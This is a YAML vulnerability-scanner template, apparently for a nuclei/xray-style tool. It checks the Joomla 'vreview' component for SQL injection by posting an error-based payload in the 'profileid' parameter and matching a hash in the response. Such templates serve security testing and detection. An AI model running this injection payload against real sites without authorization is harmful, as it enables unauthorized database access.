id: poc-yaml-joomla-component-vreview-sql
info:
  name: Joomla Component Vreview Sql
  severity: medium
  tags:
  - sql-injection
  finger: Joomla
  reference: []
  description: null
variables:
  r1: random_int(10000, 21000)
transport: http
requests:
- method: POST
  path: /index.php?option=com_vreview&task=displayReply
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: profileid=-8511 OR 1 GROUP BY CONCAT(0x7e,md5({{.r1}}),0x7e,FLOOR(RAND(0)*2))
    HAVING MIN(0)#
  redirect: false
  raw: null
  timeout: null
  expression: contains(body, substr(md5(r1),0,31))
  output: []
